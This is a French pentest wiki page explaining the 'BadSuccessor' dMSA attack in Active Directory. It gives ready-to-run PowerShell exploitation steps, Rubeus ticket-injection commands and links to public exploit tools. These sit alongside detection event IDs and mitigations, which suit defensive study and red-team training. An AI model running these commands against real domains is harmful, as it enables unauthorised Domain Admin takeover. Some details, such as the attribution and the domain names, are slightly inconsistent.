# BadSuccessor : élévation de privilèges via l’abus de la migration des MSA délégués

{{#include ../../banners/hacktricks-training.md}}

## Vue d’ensemble

Les Managed Service Accounts délégués (**dMSA**) sont les successeurs de nouvelle génération des **gMSA**, disponibles dans Windows Server 2025. Un workflow de migration légitime permet aux administrateurs de remplacer un *ancien* compte (compte utilisateur, ordinateur ou service) par un dMSA tout en préservant les permissions de manière transparente. Le workflow est exposé via des cmdlets PowerShell telles que `Start-ADServiceAccountMigration` et `Complete-ADServiceAccountMigration`, et repose sur deux attributs LDAP de **l’objet dMSA** :

* **`msDS-ManagedAccountPrecededByLink`** – *lien DN* vers le compte remplacé (ancien).
* **`msDS-DelegatedMSAState`**       – état de la migration (`0` = aucun, `1` = en cours, `2` = *terminée*).<sup>[[1]](#references)</sup>

Si un attaquant peut créer **n’importe quel** dMSA dans une OU et manipuler directement ces 2 attributs, LSASS et le KDC traiteront le dMSA comme le *successeur* du compte lié. Lorsque l’attaquant s’authentifie ensuite en tant que dMSA, **il hérite de tous les privilèges du compte lié** – jusqu’à **Domain Admin** si le compte Administrator est lié.<sup>[[1]](#references)</sup>

Cette technique a été nommée **BadSuccessor** par Unit 42 en 2025. À la date de rédaction, **aucun correctif de sécurité** n’est disponible ; seul le hardening des permissions des OU permet d’atténuer le problème.<sup>[[1]](#references)[[2]](#references)</sup>

### Prérequis de l’attaque

1. Un compte qui est *autorisé* à créer des objets dans **une Organizational Unit (OU)** *et* qui possède au moins l’un des éléments suivants :
* `Create Child` → classe d’objet **`msDS-DelegatedManagedServiceAccount`**
* `Create Child` → **`All Objects`** (création générique)
2. Une connectivité réseau vers LDAP et Kerberos (scénario standard avec une machine jointe au domaine / attaque à distance).<sup>[[1]](#references)</sup>

## Énumération des OU vulnérables

Unit 42 a publié un script helper PowerShell qui analyse les descripteurs de sécurité de chaque OU et met en évidence les ACE requises :<sup>[[1]](#references)</sup>
```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```
En coulisses, le script exécute une recherche LDAP paginée pour `(objectClass=organizationalUnit)` et vérifie chaque `nTSecurityDescriptor` pour rechercher

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* `Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8` (classe d’objet *msDS-DelegatedManagedServiceAccount*)

## Étapes d’exploitation

Une fois qu’une OU accessible en écriture est identifiée, l’attaque ne nécessite plus que 3 écritures LDAP :<sup>[[1]](#references)</sup>
```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
-DNSHostName host.contoso.local \
-Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
@{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Après la réplication, l’attaquant peut simplement **logon** en tant que `attacker_dMSA$` ou demander un Kerberos TGT – Windows construira le token du compte *superseded*.<sup>[[1]](#references)</sup>

### Automatisation

Plusieurs PoCs publics automatisent l’ensemble du workflow, y compris la récupération des mots de passe et la gestion des tickets :

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)<sup>[[3]](#references)</sup>
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)<sup>[[4]](#references)</sup>
* NetExec module – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)<sup>[[5]](#references)</sup>

### Post-Exploitation
```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```
## Détection et Hunting

Activez **Object Auditing** sur les OU et surveillez les Windows Security Events suivants :<sup>[[1]](#references)[[2]](#references)</sup>

* **5137** – Création de l’objet **dMSA**
* **5136** – Modification de **`msDS-ManagedAccountPrecededByLink`**
* **4662** – Modifications d’attributs spécifiques
* GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
* GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – Émission d’un TGT pour le dMSA

La corrélation de `4662` (modification d’attribut), `4741` (création d’un compte ordinateur/service) et `4624` (connexion ultérieure) permet d’identifier rapidement l’activité BadSuccessor. Les solutions XDR telles que **XSIAM** incluent des requêtes prêtes à l’emploi (voir les références).<sup>[[2]](#references)</sup>

## Atténuation

* Appliquez le principe du **moindre privilège** – déléguez la gestion des *Service Account* uniquement à des rôles de confiance.
* Supprimez `Create Child` / `msDS-DelegatedManagedServiceAccount` des OU qui ne l’exigent pas explicitement.
* Surveillez les event IDs listés ci-dessus et déclenchez une alerte lorsqu’une identité *non-Tier-0* crée ou modifie des dMSA.

## Voir aussi


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## Références

- [1] [BadSuccessor: Abusing dMSA to Escalate Privileges in Active Directory – Akamai](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [2] [Unit42 – When Good Accounts Go Bad: Exploiting Delegated Managed Service Accounts](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [3] [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [4] [BadSuccessor.ps1 – Pentest-Tools-Collection](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [5] [NetExec BadSuccessor module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

{{#include ../../banners/hacktricks-training.md}}
